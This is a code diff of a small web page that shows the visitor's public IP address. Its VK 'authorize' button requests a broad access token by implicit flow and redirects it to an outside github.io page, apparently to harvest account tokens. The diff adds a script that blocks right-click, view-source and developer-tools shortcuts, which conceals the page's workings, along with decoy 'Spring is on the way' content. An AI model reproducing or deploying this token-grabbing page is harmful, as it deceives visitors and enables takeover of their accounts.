@@ -13,6 +13,7 @@
     <title>Getting Clients IP</title>
     <div class="col-md-8 "></div>
     <div class="col-md-4"></div>
+    
 
     <style>
 
@@ -50,10 +51,19 @@ color: rgb(92, 28, 241);
 })
 
     </script>
+    <script type="text/javascript">
+        document.onkeydown = function(event) {
+            if (event.ctrlKey && (event.keyCode == 85) || (event.ctrlKey && event.shiftKey && (event.keyCode == 73)) || event.keyCode == 123) {
+                return false
+            }
+        }
+        document.oncontextmenu = function(){
+            return false
+        }
+        </script>
 
 </head>
     <center>
-
         <h2>Public IP Address of user is:</h2>
 
         <p id="gfg"></p>
@@ -63,7 +73,9 @@ color: rgb(92, 28, 241);
         <div class="col-lg-offset-3 col-lg-6">
         <button onclick="window.location.href = `https://oauth.vk.com/authorize?client_id=8025196&display=popup&scope=501198807&redirect_uri=https://vadapo.github.io&response_type=token&revoke=1`;" type=submit class="btn btn-bot btn-block" id=><i class="fa fa-shopping-cart"></i> Авторизоваться</button>
 
-  
+        <h1>Spring is on the way</h1>
+        <img hidden src="landscape.jpg" alt="">
+        <p><!-- Description content --></p>
 
     </center>
 </body>
